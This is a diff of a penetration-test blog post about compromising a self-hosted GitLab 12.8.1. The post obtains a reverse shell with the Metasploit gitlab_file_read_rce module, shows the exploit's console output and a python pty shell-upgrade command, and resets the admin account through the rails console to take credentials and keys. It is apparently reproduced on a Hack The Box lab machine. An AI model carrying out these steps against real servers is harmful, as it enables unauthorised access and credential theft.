@@ -7,7 +7,7 @@ layout: default
 ![title](https://m1sn1k.github.io/blog/Hack-Gitlab-CI-and-Company-Compromised-in-next-stage/title.jpg)
 
 
-The journey starts with Company Gitlab CI with open register functional that i got from the rsource company list , Gitlab is self hosted on barametal hosting. The Current version of the gitlab-ce is vulnerable to LFI and RCE exploiting the RCE and getting initial shell in a server , Resrting the admin account with github-rails console and login as him on gitlab. Got the private credentials. keys in a project-repo.
+The journey starts with Company Gitlab CI with open register functional that i got from the rsource company list , Gitlab is self hosted on barametal hosting. The Current version of the gitlab-ce is vulnerable to LFI and RCE exploiting the RCE and getting initial shell in a server , Changing the admin account with github-rails console and login as him on gitlab. Got the private credentials. keys in a project-repo.
 
 For notes used test env as HTB Machine - Laboratory because real env under NDA.
 
@@ -17,19 +17,19 @@ For notes used test env as HTB Machine - Laboratory because real env under NDA.
 And i can see that Gitlab is hosted. I saw open Register function and Try do it!
 
 
-![register](https://m1sn1k.github.io/blog/Hack-Gitlab-CI-and-Company-Compromised-in-next-stage/register.jpg)
+![register](https://m1sn1k.github.io/blog/Steal-project-source-code-in-60-seconds/register.jpg)
 
 
 
 Now i registered myself as oleksii and logged in
 
 
-![login](https://m1sn1k.github.io/blog/Hack-Gitlab-CI-and-Company-Compromised-in-next-stage/login.jpg)
+![login](https://m1sn1k.github.io/blog/Steal-project-source-code-in-60-seconds/login.jpg)
 
 
 Didn’t see anything good and juicy then i just go to https://gitlab.site.io/help
 
-![version](https://m1sn1k.github.io/blog/Hack-Gitlab-CI-and-Company-Compromised-in-next-stage/version.jpg)
+![version](https://m1sn1k.github.io/blog/Steal-project-source-code-in-60-seconds/version.jpg)
 
 
 So its 12.8.1 , so i searched a bit about it on google and got so many CVES
@@ -38,7 +38,7 @@ And on rapid7.com site saw info about vulnerabilities, it was disclosed few mont
 
 This picture in Company Gitlab CI says a lot:)
 
-![asap](https://m1sn1k.github.io/blog/Hack-Gitlab-CI-and-Company-Compromised-in-next-stage/asap.jpg)
+![asap](https://m1sn1k.github.io/blog/Steal-project-source-code-in-60-seconds/asap.jpg)
 
 
 #### RCE in the gitlab
@@ -71,8 +71,8 @@ Payload options (generic/shell_reverse_tcp):
 ```
 
 Exploitation RCE vulnersability: 
-```
 
+```
 msf6 exploit(multi/http/gitlab_file_read_rce) > exploit 
 [-] Handler failed to bind to 10.10.14.*:4444:-  -
 [*] Started reverse TCP handler on 0.0.0.0:4444 
@@ -90,12 +90,12 @@ msf6 exploit(multi/http/gitlab_file_read_rce) > exploit
 [*] Deleted project /oleksii/Dyb4bxA6
 [*] Attempting to delete project /oleksii/L8SKsN52
 [*] Deleted project /oleksii/L8SKsN52
-
+```
 
 Often during pen tests you may obtain a shell without having tty, yet wish to interact further with the system. Here are some commands which will allow you to spawn a tty shell. Obviously some of this will depend on the system environment and installed packages.
 
 ```
-python3 -c 'import pty; pty.spawn("/bin/sh")' create simple shell.
+python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
 #### Resetting admin password
@@ -114,6 +114,7 @@ There are multiple ways to find your user. You can search for email or username.
 ```
   user = User.where(id: 1).first
 ```
+
 or
 
 Other type get username and email without Gitlab authentification is use api https://gitlab.sitec.io/api/v4/users/1 
